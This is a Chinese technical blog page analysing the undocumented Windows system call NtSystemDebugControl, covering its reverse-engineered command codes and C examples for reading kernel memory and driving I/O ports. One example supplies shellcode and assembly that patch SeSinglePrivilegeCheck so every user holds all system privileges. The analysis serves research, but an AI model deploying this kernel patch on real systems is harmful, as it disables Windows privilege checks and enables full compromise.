<!doctype html><html lang=zh-CN data-theme=dark><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=theme-color content="#222" media="(prefers-color-scheme: dark)"><meta name=generator content="Hugo 0.152.2"><link rel="shortcut icon" type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/png sizes=16x16 href=/imgs/icons/favicon_32_32_next.png><link rel=icon type=image/png sizes=32x32 href=/imgs/icons/favicon_128_128_next.png><link rel=apple-touch-icon sizes=180x180 href=/imgs/icons/apple_touch_icon_next.png><meta itemprop=name content="对Native API NtSystemDebugControl的分析"><meta itemprop=description content="福兮祸兮，焉知所依？冬去冰泮，春来萌荣。朝生暮死，亦可惊鸿。知足者富，自足者强。"><meta name=description content="福兮祸兮，焉知所依？冬去冰泮，春来萌荣。朝生暮死，亦可惊鸿。知足者富，自足者强。"><meta itemprop=datePublished zgotmplz><meta itemprop=dateModified zgotmplz><meta itemprop=image content="https://blogs.qipai360.cn/imgs/avatar.jpg"><meta itemprop=keywords content="Rise,ZhangTuohui,技术,C++,Unity3D,Lua,NodeJS,C#,JavaScript,游戏开发,机器学习,深度学习,AI,编程,编程语言,编程技术,编程开发,游戏引擎,游戏设计,游戏制作,游戏开发者,游戏开发者博客,游戏开发者网站,游戏开发者工具,游戏开发者教程,游戏开发者学习,游戏开发者交流,游戏开发者分享,游戏开发者经验,游戏开发者心得,游戏开发者技巧,游戏开发者方法,游戏开发者思路,游戏开发者理念,游戏开发者文化,游戏开发者精神,游戏开发者信仰"><meta property="og:type" content="article"><meta property="og:title" content="对Native API NtSystemDebugControl的分析"><meta property="og:description" content="福兮祸兮，焉知所依？冬去冰泮，春来萌荣。朝生暮死，亦可惊鸿。知足者富，自足者强。"><meta property="og:image" content="/imgs/avatar.jpg"><meta property="og:image:width" content="312"><meta property="og:image:height" content="312"><meta property="og:image:type" content="image/jpeg/png/svg/jpg"><meta property="og:url" content="https://blogs.qipai360.cn/post/native-api-ntsystemdebugcontrol-analysis/"><meta property="og:site_name" content="Rise的自留地"><meta property="og:locale" content="zh-CN"><meta property="article:author" content="Rise"><meta property="article:published_time" content="2008-03-29 12:01:00 +0800 +0800"><meta property="article:modified_time" content="2008-03-29 12:01:00 +0800 +0800"><link type=text/css rel=stylesheet href=https://blogs.qipai360.cn/js/3rd/font-awesome/6.7.2/css/all.min.css><link type=text/css rel=stylesheet href=https://blogs.qipai360.cn/js/3rd/animate.css/3.1.1/animate.min.css><link type=text/css rel=stylesheet href=https://blogs.qipai360.cn/js/3rd/viewerjs/1.11.6/viewer.min.css><link rel=stylesheet href="/css/main.min.css?=1761990628"><style type=text/css>.post-footer hr:after{content:"~ 我可是有底线的哟 ~"}.flinks-list-footer hr:after{content:"~ 我可是有底线的哟 ~"}</style><script type=text/javascript>(function(){localDB={set:function(e,t,n){if(n===0)return;const s=new Date,o=n*864e5,i={value:t,expiry:s.getTime()+o};localStorage.setItem(e,JSON.stringify(i))},get:function(e){const t=localStorage.getItem(e);if(!t)return 0[0];const n=JSON.parse(t),s=new Date;return s.getTime()>n.expiry?(localStorage.removeItem(e),0[0]):n.value}},theme={active:function(){const e=localDB.get("theme");if(e==null)return;theme.toggle(e),window.matchMedia("(prefers-color-scheme: dark)").addListener(function(e){theme.toggle(e.matches?"dark":"light")})},toggle:function(e){document.documentElement.setAttribute("data-theme",e),localDB.set("theme",e,2);const t=document.querySelector("iframe.giscus-frame");if(t){const n={setConfig:{theme:e}};t.contentWindow.postMessage({giscus:n},"https://giscus.app")}}},theme.active()})(window)</script><script type=text/javascript>document.addEventListener("DOMContentLoaded",()=>{var e=document.createElement("script");e.charset="UTF-8",e.src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js",e.async=!1,e.defer=!0,document.head.appendChild(e),e.onload=function(){NexT.utils.fmtBusuanzi()}})</script><script defer src=https://static.cloudflareinsights.com/beacon.min.js data-cf-beacon='{"token": "2b23669184fc49269e400525ac2447d9"}'></script><title>对Native API NtSystemDebugControl的分析 - Rise的自留地</title><noscript><link rel=stylesheet href=/css/noscript.css></noscript></head><body itemscope itemtype=http://schema.org/WebPage class=use-motion><div class=headband></div><main class=main><header class=header itemscope itemtype=http://schema.org/WPHeader><div class=header-inner><div class=site-brand-container><div class=site-nav-toggle><div class=toggle aria-label role=button><span class=toggle-line></span>
<span class=toggle-line></span>
<span class=toggle-line></span></div></div><div class=site-meta><a href=/ class=brand rel=start><i class=logo-line></i><h1 class=site-title>Rise的自留地</h1><i class=logo-line></i></a><p class=site-subtitle itemprop=description>记录生活中的点滴，分享编程技术和游戏开发经验。</p></div><div class=site-nav-right><div class="toggle popup-trigger"></div></div></div><nav class=site-nav><ul class="main-menu menu"><li class="menu-item menu-item-home"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-home hvr-icon"></i>首页</a></li><li class="menu-item menu-item-about"><a href=/about.html class=hvr-icon-pulse rel=section><i class="fa fa-user hvr-icon"></i>关于</a></li><li class="menu-item menu-item-archives"><a href=/archives/ class=hvr-icon-pulse rel=section><i class="fa fa-archive hvr-icon"></i>归档
<span class=badge>678</span></a></li><li class="menu-item menu-item-tags"><a href=/tags/ class=hvr-icon-pulse rel=section><i class="fa fa-tags hvr-icon"></i>标签</a></li><li class="menu-item menu-item-message"><a href=/message/ class=hvr-icon-pulse rel=section><i class="fa fa-comments hvr-icon"></i>留言板</a></li><li class="menu-item menu-item-commonweal"><a href=/404.html class=hvr-icon-pulse rel=section><i class="fa fa-heartbeat hvr-icon"></i>公益 404</a></li></ul></nav></div><div class="toggle sidebar-toggle" role=button><span class=toggle-line></span>
<span class=toggle-line></span>
<span class=toggle-line></span></div><aside class=sidebar><div class="sidebar-inner sidebar-overview-active"><ul class=sidebar-nav><li class=sidebar-nav-toc>文章目录</li><li class=sidebar-nav-overview>站点概览</li></ul><div class=sidebar-panel-container><div class="post-toc-wrap sidebar-panel"><div class="post-toc animated"><nav id=TableOfContents></nav></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author site-overview-item animated" itemprop=author itemscope itemtype=http://schema.org/Person><img class=site-author-image itemprop=image alt=Rise src=/imgs/img-lazy-loading.gif data-src=/imgs/avatar.jpg><p class=site-author-name itemprop=name>Rise</p><div class=site-description itemprop=description>福兮祸兮，焉知所依？冬去冰泮，春来萌荣。朝生暮死，亦可惊鸿。知足者富，自足者强。</div></div><div class="site-state-wrap site-overview-item animated"><nav class=site-state><div class="site-state-item site-state-posts"><a href=/archives/><span class=site-state-item-count>678</span>
<span class=site-state-item-name>日志</span></a></div><div class="site-state-item site-state-categories"><a href=/categories/><span class=site-state-item-count>34</span>
<span class=site-state-item-name>分类</span></a></div><div class="site-state-item site-state-tags"><a href=/tags/><span class=site-state-item-count>117</span>
<span class=site-state-item-name>标签</span></a></div></nav></div><div class="links-of-social site-overview-item animated"><span class=links-of-social-item><a href=https://github.com/rise-worlds title="Github → https://github.com/rise-worlds" rel=noopener class=hvr-icon-pulse target=_blank><i class="fab fa-github fa-fw hvr-icon"></i>
Github
</a></span><span class=links-of-social-item><a href=mailto:rise.worlds@outlook.com title="E-Mail → mailto:rise.worlds@outlook.com" rel=noopener class=hvr-icon-pulse target=_blank><i class="fa fa-envelope fa-fw hvr-icon"></i>
E-Mail
</a></span><span class=links-of-social-item><a href=https://www.zhihu.com/people/rise-worlds title="知乎 → https://www.zhihu.com/people/rise-worlds" rel=noopener class=hvr-icon-pulse target=_blank><i class="fa fa-book fa-fw hvr-icon"></i>
知乎
</a></span><span class=links-of-social-item><a href=https://twitter.com/riseworlds title="Twitter → https://twitter.com/riseworlds" rel=noopener class=hvr-icon-pulse target=_blank><i class="fab fa-twitter fa-fw hvr-icon"></i>
Twitter
</a></span><span class=links-of-social-item><a href=https://www.facebook.com/rise.worlds title="facebook → https://www.facebook.com/rise.worlds" rel=noopener class=hvr-icon-pulse target=_blank><i class="fab fa-facebook fa-fw hvr-icon"></i>
facebook
</a></span><span class=links-of-social-item><a href=https://youtube.com/@YiXuan title="YouTube → https://youtube.com/@YiXuan" rel=noopener class=hvr-icon-pulse target=_blank><i class="fab fa-youtube fa-fw hvr-icon"></i>
YouTube
</a></span><span class=links-of-social-item><a href=https://instagram.com/rise.worlds title="Instagram → https://instagram.com/rise.worlds" rel=noopener class=hvr-icon-pulse target=_blank><i class="fab fa-instagram fa-fw hvr-icon"></i>
Instagram
</a></span><span class=links-of-social-item><a href=https://t.me/riseworlds title="Telegram → https://t.me/riseworlds" rel=noopener class=hvr-icon-pulse target=_blank><i class="fab fa-telegram fa-fw hvr-icon"></i>
Telegram</a></span></div><div class="links-of-blogroll site-overview-item animated"><div class=links-of-blogroll-title><i class="fa fa-globe fa-fw"></i>
友情链接</div><ul class=links-of-blogroll-list><li class=links-of-blogroll-item><a href=https://www.qipai360.cn title=https://www.qipai360.cn target=_blank>Qipai360</a></li><li class=links-of-blogroll-item><a href=https://www.cnblogs.com/flying_bat title=https://www.cnblogs.com/flying_bat target=_blank>博客园</a></li><li class=links-of-blogroll-item><a href=https://zishu.me title=https://zishu.me target=_blank>子舒的博客</a></li><li class=links-of-blogroll-item><a href=https://gitee.com/hugo-next/hugo-theme-next title=https://gitee.com/hugo-next/hugo-theme-next target=_blank>Hugo-NexT</a></li></ul></div></div></div></div><div id=siteinfo-card-widget class=sidebar-card-widget><div class=item-headline><i class="fas fa-chart-line"></i>
<span>网站资讯</span></div><div class=siteinfo><div class=siteinfo-item><div class=item-name><i class="fa-solid fa-calendar-check"></i>已运行：</div><div class=item-count id=runTimes data-publishdate="2004-10-06 15:24:00 +0800 +0800"></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-user"></i>总访客数：</div><div class=item-count id=busuanzi_value_site_uv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-eye"></i>页面浏览：</div><div class=item-count id=busuanzi_value_site_pv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-font"></i>总字数：</div><div class=item-count id=wordsCount data-count=2418817></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-mug-hot"></i>阅读约：</div><div class=item-count id=readTimes data-times=5198></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-clock-rotate-left"></i>最后更新于：</div><div class=item-count id=last-push-date data-lastpushdate="2025-11-01 14:55:00 +0800 +0800"></div></div></div></div></aside><div class=sidebar-dimmer></div></header><div class=tool-buttons><div id=goto-comments class="button goto-comments" title=直达评论><i class="fas fa-comments"></i></div><div id=toggle-theme class=button title=深浅模式切换><i class="fas fa-adjust"></i></div><div class=back-to-top role=button title=返回顶部><i class="fa fa-arrow-up"></i>
<span>0%</span></div></div><div class=reading-progress-bar></div><a role=button class="book-mark-link book-mark-link-fixed"></a><a href=https://github.com/rise-worlds rel="noopener external nofollow noreferrer" target=_blank title="Follow me on GitHub" class="exturl github-corner"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0 0 115 115h15l12 27L250 250V0z"/><path d="M128.3 109C113.8 99.7 119 89.6 119 89.6 122 82.7 120.5 78.6 120.5 78.6 119.2 72 123.4 76.3 123.4 76.3 127.3 80.9 125.5 87.3 125.5 87.3 122.9 97.6 130.6 101.9 134.4 103.2" fill="currentColor" style="transform-origin:130px 106px" class="octo-arm"/><path d="M115 115C114.9 115.1 118.7 116.5 119.8 115.4l13.9-13.8C136.9 99.2 139.9 98.4 142.2 98.6 133.8 88 127.5 74.4 143.8 58 148.5 53.4 154 51.2 159.7 51 160.3 49.4 163.2 43.6 171.4 40.1 171.4 40.1 176.1 42.5 178.8 56.2 183.1 58.6 187.2 61.8 190.9 65.4 194.5 69 197.7 73.2 200.1 77.6 213.8 80.2 216.3 84.9 216.3 84.9 212.7 93.1 206.9 96 205.4 96.6 205.1 102.4 203 107.8 198.3 112.5 181.9 128.9 168.3 122.5 157.7 114.1 157.9 116.9 156.7 120.9 152.7 124.9L141 136.5C139.8 137.7 141.6 141.9 141.8 141.8z" fill="currentColor" class="octo-body"/></svg></a><noscript><div class=noscript-warning>Theme NexT works best with JavaScript enabled</div></noscript><div class="main-inner post posts-expand"><div class=post-block><article itemscope itemtype=http://schema.org/Article class=post-content lang><link itemprop=mainEntityOfPage href=https://blogs.qipai360.cn/post/native-api-ntsystemdebugcontrol-analysis/><span hidden itemprop=author itemscope itemtype=http://schema.org/Person><meta itemprop=image content="/imgs/avatar.jpg"><meta itemprop=name content="Rise"></span><span hidden itemprop=publisher itemscope itemtype=http://schema.org/Organization><meta itemprop=name content="Rise"><meta itemprop=description content="福兮祸兮，焉知所依？冬去冰泮，春来萌荣。朝生暮死，亦可惊鸿。知足者富，自足者强。"></span><span hidden itemprop=post itemscope itemtype=http://schema.org/CreativeWork><meta itemprop=name content="对Native API NtSystemDebugControl的分析"><meta itemprop=description content="对Native API NtSystemDebugControl的分析文章作者：tombkeeper[0×40]nsfocus[0×2e]com 在《获取Windows 系统的内核变量》中，我提及了在Windows NT 5.1以上的系统中存在一个功能强大的 Native API NtSystemDebugControl，下面我们来看看它到底有多强大。 NtSystemDebugControl是Windows NT系列操作系统上实现的一个系统调用，在不同系统上的调用号分别为： Windows NT 0xbaWindows 2000 0xdeWindows XP 0xffWindows 2003 0×108 这是一个未文档化的 API，《Windows NT/2000 Native API Reference》中有相关介绍。官方定义可以在一个微软的private头文件ntexapi.h中找到。该文件中还包含很多其它内部数据结构。可能Windows NT 4的SDK中还曾经有过这个文件（至少NT4ResourceKit的支持文档里面是这样说的），但现在似乎微软只提供给它的合作伙伴。好在NTKernel新闻组上有一个“very kind person”共享了这个头文件，你可以从参考资源[2]的两个链接中得到它。 这就是ntexapi.h中的定义： typedef enum _SYSDBG_COMMAND {SysDbgQueryTraceInformation = 1, //KdGetTraceInformation()SysDbgSetTracepoint = 2, //KdSetInternalBreakpoint()SysDbgSetSpecialCall = 3, //KdSetSpecialCall()SysDbgClearSpecialCalls = 4, //KdClearSpecialCalls()SysDbgQuerySpecialCalls = 5, //KdQuerySpecialCalls()SysDbgQueryModuleInformation //ntexapi.h中有，但实际上未实现} SYSDBG_COMMAND, *PSYSDBG_COMMAND; NTSYSAPINTSTATUSNTAPINtSystemDebugControl (IN SYSDBG_COMMAND Command,IN PVOID InputBuffer,IN ULONG InputBufferLength,OUT PVOID OutputBuffer,IN ULONG OutputBufferLength,OUT PULONG ReturnLength); 从上面可以看出，Windows NT和Windows 2000上的NtSystemDebugControl通过不同的第一形参可调用五个内核函数，实现相关功能。 NtSystemDebugControl在Windows NT和Windows 2000上的功能还是比较简陋的，《Windows NT/2000 Native API Reference》一书对这些已经介绍的很详细了，本文不再赘述。 从Windows NT 5.1内核（Windows XP）开始，NtSystemDebugControl的功能被极大扩增了。根据逆向工程的结果来看，在Windows XP上NtSystemDebugControl的第一形参可接受 20个不同的功能调用，在Windows 2003上则有28个。 关于NtSystemDebugControl在Windows NT 5.1以上的实现，互联网上唯一能找到的资料是BUGTRAQ ID 9694关于该 API的一个漏洞报告（参考资源[1]），事实上，这个所谓漏洞是不能称之为漏洞的，因为调用这个API需要SeDebugPrivilege 特权，普通用户根本执行不了，也就谈不上权限提升。 下面的enum是我逆向工程的结果，绝大部分经过测试： typedef enum _SYSDBG_COMMAND {//以下5个在Windows NT各个版本上都有SysDbgGetTraceInformation = 1,SysDbgSetInternalBreakpoint = 2,SysDbgSetSpecialCall = 3,SysDbgClearSpecialCalls = 4,SysDbgQuerySpecialCalls = 5, // 以下是NT 5.1 新增的SysDbgDbgBreakPointWithStatus = 6, //获取KdVersionBlockSysDbgSysGetVersion = 7, //从内核空间拷贝到用户空间，或者从用户空间拷贝到用户空间//但是不能从用户空间拷贝到内核空间SysDbgCopyMemoryChunks_0 = 8,//SysDbgReadVirtualMemory = 8, //从用户空间拷贝到内核空间，或者从用户空间拷贝到用户空间//但是不能从内核空间拷贝到用户空间SysDbgCopyMemoryChunks_1 = 9,//SysDbgWriteVirtualMemory = 9, //从物理地址拷贝到用户空间，不能写到内核空间SysDbgCopyMemoryChunks_2 = 10,//SysDbgReadVirtualMemory = 10, //从用户空间拷贝到物理地址，不能读取内核空间SysDbgCopyMemoryChunks_3 = 11,//SysDbgWriteVirtualMemory = 11, //读写处理器相关控制块SysDbgSysReadControlSpace = 12,SysDbgSysWriteControlSpace = 13, //读写端口SysDbgSysReadIoSpace = 14,SysDbgSysWriteIoSpace = 15, //分别调用RDMSR@4和_WRMSR@12SysDbgSysReadMsr = 16,SysDbgSysWriteMsr = 17, //读写总线数据SysDbgSysReadBusData = 18,SysDbgSysWriteBusData = 19, SysDbgSysCheckLowMemory = 20, // 以下是NT 5.2 新增的 //分别调用_KdEnableDebugger@0和_KdDisableDebugger@0SysDbgEnableDebugger = 21,SysDbgDisableDebugger = 22, //获取和设置一些调试相关的变量SysDbgGetAutoEnableOnEvent = 23,SysDbgSetAutoEnableOnEvent = 24,SysDbgGetPitchDebugger = 25,SysDbgSetDbgPrintBufferSize = 26,SysDbgGetIgnoreUmExceptions = 27,SysDbgSetIgnoreUmExceptions = 28} SYSDBG_COMMAND, *PSYSDBG_COMMAND; 从上面可以看出，在Windows NT 5.1以上的NtSystemDebugControl可以实现读写内核线性空间数据、读写物理内存、读写端口、读写总线数据、读写MSR 等功能；在Windows NT 5.2以上还可以在系统运行状态下使能、禁用内核调试以及获取、设置一些相关变量等。 显然，从Windows XP开始，我们再次获得了MS DOS时代直接操纵系统的权杖，戴着桂冠，重新回到了奥林匹斯山之巅。 下面举几个具体应用的例子。 例子1： 下面代码演示读取KdVersionBlock： //————————————————————————typedef struct _DBGKD_GET_VERSION64 {USHORT MajorVersion;USHORT MinorVersion;USHORT ProtocolVersion;USHORT Flags;USHORT MachineType;UCHAR MaxPacketType;UCHAR MaxStateChange;UCHAR MaxManipulate;UCHAR Simulation;USHORT Unused[1];ULONG64 KernBase;ULONG64 PsLoadedModuleList;ULONG64 DebuggerDataList;} DBGKD_GET_VERSION64, *PDBGKD_GET_VERSION64; DBGKD_GET_VERSION64 KdVersionBlock; EnablePrivilege(SE_DEBUG_NAME); ZwSystemDebugControl(SysDbgSysGetVersion,NULL,0,&amp;KdVersionBlock,sizeof(KdVersionBlock), //必须是0×28NULL); printf (”KernBase: 0x%.8x\n”,KdVersionBlock.KernBase);printf (”PsLoadedModuleList: 0x%.8x\n”,KdVersionBlock.PsLoadedModuleList);printf (”DebuggerDataList: 0x%.8x\n”,KdVersionBlock.DebuggerDataList);//———————————————————————— 例子2： 下面代码演示读取内核空间数据的操作，这里读取的是Windows 2003内核映像的头两个字节，也就是“MZ”。 //————————————————————————typedef struct _MEMORY_CHUNKS {ULONG Address;PVOID Data;ULONG Length;}MEMORY_CHUNKS, *PMEMORY_CHUNKS; MEMORY_CHUNKS QueryBuff;ULONG ReturnLength;char Buff[0×2] = {0}; QueryBuff.Address = 0×804e0000; //Windows 2003的KernBaseQueryBuff.Data = Buff; //在此是读出缓冲QueryBuff.Length = sizeof(Buff); EnablePrivilege(SE_DEBUG_NAME); ZwSystemDebugControl(SysDbgCopyMemoryChunks_0,&amp;QueryBuff,sizeof(MEMORY_CHUNKS), //必须是0×0CNULL,0,&amp;ReturnLength); printf (”\”MZ\”: %s\n”,Buff);//———————————————————————— 例子3： 下面是一个使用NtSystemDebugControl的SysDbgCopyMemoryChunks_1功能实现的Patch内核的ShellCode，把0×80580e66由原来的8a450c改为90b001： 修改前： nt!SeSinglePrivilegeCheck+0×5c:80580e66 8a450c mov al,[ebp+0xc]80580e69 c9 leave80580e6a c20c00 ret 0xc 修改后：nt!SeSinglePrivilegeCheck+0×5c:80580e66 90 nop80580e67 b001 mov al,0×180580e69 c9 leave80580e6a c20c00 ret 0xc 这样，SeSinglePrivilegeCheck总是返回True，也就是说，无论哪个用户，总是拥有全部系统特权。 \xeb\x09\x66\xb8\x08\x01\x8b\xd4\x0f\x34\xc3\x68\x90\xb0\x01\xc9\x8b\xc4\x6a\x04\x50\x68\x66\x0e\x58\x80\x54\x5b\x33\xc0\x50\x54\x50\x50\x6a\x0c\x53\x6a\x09\x50\xe8\xd5\xff\xff\xff\x83 //————————————————————————#pragma comment(linker, “/entry:main /ALIGN:4096″ )#pragma comment(lib, “kernel32.lib”) #define sysenter __asm __emit 0×0f __asm __emit 0×34 void main(void){__asm{int 3 //debugjmp patch SystemDebugControl: mov ax,0×108mov edx,espsysenterret patch: push 0xc901b090mov eax,esppush 0×04push eaxpush 0×80580e66push esppop ebxxor eax,eaxpush eaxpush esp //ReturnLengthpush eax //OutputBufferLengthpush eax //OutputBufferpush 0×0c //InputBufferLengthpush ebx //InputBufferpush 0×09 //ControlCodepush eax //for sysenter retcall SystemDebugControladd esp,0×30 //只是为了修正堆栈}}//———————————————————————— 上面只是一个概念代码，使用的Patch地址是固定的，对5.2.3790.0 版本的内核有效。由于调用NtSystemDebugControl 要SeDebugPrivilege，所以这段ShellCode需要在LocalSystem 的身份的进程空间运行，或者自己增加SeDebugPrivilege。最简单的办法就是在WinDBG中执行。 例子4： 下面是一段完整的代码，利用NtSystemDebugControl读写端口的能力，直接操纵PC Speaker发声： //————————————————————————//演示用ZwSystemDebugControl读写端口使PC Speaker发声//tombkeeper 2004.08.03 #include #include  #pragma comment(lib, “advapi32″) #define NTAPI __stdcall#define FCHK(a) if (!(a)) {printf(#a ” failed\n”); return 0;} typedef int NTSTATUS; typedef enum _SYSDBG_COMMAND{SysDbgSysReadIoSpace = 14,SysDbgSysWriteIoSpace = 15}SYSDBG_COMMAND, *PSYSDBG_COMMAND; typedef NTSTATUS (NTAPI * PZwSystemDebugControl) (SYSDBG_COMMAND ControlCode,PVOID InputBuffer,ULONG InputBufferLength,PVOID OutputBuffer,ULONG OutputBufferLength,PULONG ReturnLength); PZwSystemDebugControl ZwSystemDebugControl = NULL; typedef struct _IO_STRUCT{DWORD IoAddr; // IN: Aligned to NumBYTEs,I/O addressDWORD Reserved1; // Never accessed by the kernelPVOID pBuffer; // IN (write) or OUT (read): Ptr to bufferDWORD NumBYTEs; // IN: # BYTEs to read/write. Only use 1, 2, or 4.DWORD Reserved4; // Must be 1DWORD Reserved5; // Must be 0DWORD Reserved6; // Must be 1DWORD Reserved7; // Never accessed by the kernel}IO_STRUCT, *PIO_STRUCT; BOOL EnablePrivilege (PCSTR name){HANDLE hToken;BOOL rv; TOKEN_PRIVILEGES priv = { 1, {0, 0, SE_PRIVILEGE_ENABLED} };LookupPrivilegeValue (0,name,&amp;priv.Privileges[0].Luid); OpenProcessToken(GetCurrentProcess (),TOKEN_ADJUST_PRIVILEGES,&amp;hToken); AdjustTokenPrivileges (hToken,FALSE,&amp;priv,sizeof priv,0,0);rv = GetLastError () == ERROR_SUCCESS; CloseHandle (hToken);return rv;} BYTE InPortB (int Port){BYTE Value;IO_STRUCT io; io.IoAddr = Port;io.Reserved1 = 0;io.pBuffer = (PVOID) (PULONG) & Value;io.NumBYTEs = sizeof (BYTE);io.Reserved4 = 1;io.Reserved5 = 0;io.Reserved6 = 1;io.Reserved7 = 0; ZwSystemDebugControl(SysDbgSysReadIoSpace,&amp;io,sizeof (io),NULL,0,NULL);return Value;} void OutPortB (int Port, BYTE Value){IO_STRUCT io; io.IoAddr = Port;io.Reserved1 = 0;io.pBuffer = (PVOID) (PULONG) & Value;io.NumBYTEs = sizeof (BYTE);io.Reserved4 = 1;io.Reserved5 = 0;io.Reserved6 = 1;io.Reserved7 = 0; ZwSystemDebugControl(SysDbgSysWriteIoSpace,&amp;io,sizeof (io),NULL,0,NULL);}; void BeepOn (int Freq){BYTE b; if ((Freq >= 20) && (Freq <= 20000)){Freq = 1193181 / Freq;b = InPortB (0x61);if ((b & 3) == 0){OutPortB (0x61, (BYTE) (b | 3));OutPortB (0x43, 0xb6);}OutPortB (0x42, (BYTE) Freq);OutPortB (0x42, (BYTE) (Freq >> 8));}} void BeepOff (void){BYTE b; b = (InPortB (0×61) & 0xfc);OutPortB (0×61, b);} int main (void){HMODULE hNtdll;ULONG ReturnLength;OSVERSIONINFO OSVersionInfo;OSVersionInfo.dwOSVersionInfoSize = sizeof (OSVERSIONINFO); EnablePrivilege (SE_DEBUG_NAME); FCHK ((hNtdll = LoadLibrary (”ntdll.dll”)) != NULL);FCHK ((ZwSystemDebugControl = (PZwSystemDebugControl)GetProcAddress (hNtdll, “ZwSystemDebugControl”)) != NULL);FCHK ((void *) GetVersionEx (&amp;OSVersionInfo) != NULL); if (OSVersionInfo.dwPlatformId == VER_PLATFORM_WIN32_NT &&amp;OSVersionInfo.dwMajorVersion >= 5 &&amp;OSVersionInfo.dwMinorVersion >= 1) //Windows XP以上{BeepOn (1000); //声音频率1000HzSleep (1000);BeepOff ();}else{printf (”This program require Windows XP or Windows 2003.\n”);}return 0;}//———————————————————————— 参考资源： [1]Microsoft Windows NtSystemDebugControl() Kernel API Function PrivilegeEscalation Vulnerabilityhttp://www.securityfocus.com/bid/9694 [2]ntexapi.hhttp://www.codeguru.com/code/legacy/system/ntexapi.ziphttp://void.ru/files/Ntexapi.h"></span><header class=post-header><h1 class=post-title itemprop="name headline">对Native API NtSystemDebugControl的分析</h1><div class=post-meta-container><div class=post-meta-items><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-calendar"></i>
</span><span class=post-meta-item-text title=发表于>发表于：
</span><time title="创建时间：2008年03月29日 12:01:00 CST" itemprop="dateCreated datePublished" datetime="2008-03-29 12:01:00 +0800 +0800">2008年03月29日
</time></span><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-folder-open"></i>
</span><span class=post-meta-item-text title=分类于>分类于：
</span><span itemprop=about itemscope itemtype=http://schema.org/Thing><a href=/categories/safe/ itemprop=url rel=index><span itemprop=name>dev/Safe</span></a></span></span></div><div class=post-meta-items><span class=post-meta-item title=字数><span class=post-meta-item-icon><i class="fas fa-solid fa-file-word"></i>
</span><span class=post-meta-item-text>字数：</span>
<span>3542</span>
</span><span class=post-meta-item title=阅读><span class=post-meta-item-icon><i class="fas fa-solid fa-clock"></i>
</span><span class=post-meta-item-text>阅读：&ap;</span>
<span>8分钟</span>
</span><span class=post-meta-item title=浏览><span class=post-meta-item-icon><i class="fas fa-solid fa-eye"></i>
</span><span class=post-meta-item-text>浏览：
</span><span id=pageview-count data-path=/post/native-api-ntsystemdebugcontrol-analysis/><i class="fa fa-sync fa-spin"></i></span></span></div></div></header><div class=post-body itemprop=articleBody><p>对Native API NtSystemDebugControl的分析<br>文章作者：tombkeeper[0×40]nsfocus[0×2e]com<p>在《获取Windows 系统的内核变量》中，我提及了在Windows NT 5.1以上的系统<br>中存在一个功能强大的 Native API NtSystemDebugControl，下面我们来看看它到底<br>有多强大。<p>NtSystemDebugControl是Windows NT系列操作系统上实现的一个系统调用，在不<br>同系统上的调用号分别为：<p>Windows NT 0xba<br>Windows 2000 0xde<br>Windows XP 0xff<br>Windows 2003 0×108<p>这是一个未文档化的 API，《Windows NT/2000 Native API Reference》中有相<br>关介绍。官方定义可以在一个微软的private头文件ntexapi.h中找到。该文件中还包<br>含很多其它内部数据结构。可能Windows NT 4的SDK中还曾经有过这个文件（至少NT4<br>ResourceKit的支持文档里面是这样说的），但现在似乎微软只提供给它的合作伙伴。<br>好在NTKernel新闻组上有一个“very kind person”共享了这个头文件，你可以从参<br>考资源[2]的两个链接中得到它。<p>这就是ntexapi.h中的定义：<p>typedef enum _SYSDBG_COMMAND {<br>SysDbgQueryTraceInformation = 1, //KdGetTraceInformation()<br>SysDbgSetTracepoint = 2, //KdSetInternalBreakpoint()<br>SysDbgSetSpecialCall = 3, //KdSetSpecialCall()<br>SysDbgClearSpecialCalls = 4, //KdClearSpecialCalls()<br>SysDbgQuerySpecialCalls = 5, //KdQuerySpecialCalls()<br>SysDbgQueryModuleInformation //ntexapi.h中有，但实际上未实现<br>} SYSDBG_COMMAND, *PSYSDBG_COMMAND;<p>NTSYSAPI<br>NTSTATUS<br>NTAPI<br>NtSystemDebugControl (<br>IN SYSDBG_COMMAND Command,<br>IN PVOID InputBuffer,<br>IN ULONG InputBufferLength,<br>OUT PVOID OutputBuffer,<br>IN ULONG OutputBufferLength,<br>OUT PULONG ReturnLength<br>);<p>从上面可以看出，Windows NT和Windows 2000上的NtSystemDebugControl通过不<br>同的第一形参可调用五个内核函数，实现相关功能。<p>NtSystemDebugControl在Windows NT和Windows 2000上的功能还是比较简陋的，<br>《Windows NT/2000 Native API Reference》一书对这些已经介绍的很详细了，本文<br>不再赘述。<p>从Windows NT 5.1内核（Windows XP）开始，NtSystemDebugControl的功能被极<br>大扩增了。根据逆向工程的结果来看，在Windows XP上NtSystemDebugControl的第一<br>形参可接受 20个不同的功能调用，在Windows 2003上则有28个。<p>关于NtSystemDebugControl在Windows NT 5.1以上的实现，互联网上唯一能找到<br>的资料是BUGTRAQ ID 9694关于该 API的一个漏洞报告（参考资源[1]），事实上，这<br>个所谓漏洞是不能称之为漏洞的，因为调用这个API需要SeDebugPrivilege 特权，普<br>通用户根本执行不了，也就谈不上权限提升。<p>下面的enum是我逆向工程的结果，绝大部分经过测试：<p>typedef enum _SYSDBG_COMMAND {<br>//以下5个在Windows NT各个版本上都有<br>SysDbgGetTraceInformation = 1,<br>SysDbgSetInternalBreakpoint = 2,<br>SysDbgSetSpecialCall = 3,<br>SysDbgClearSpecialCalls = 4,<br>SysDbgQuerySpecialCalls = 5,<p>// 以下是NT 5.1 新增的<br>SysDbgDbgBreakPointWithStatus = 6,<p>//获取KdVersionBlock<br>SysDbgSysGetVersion = 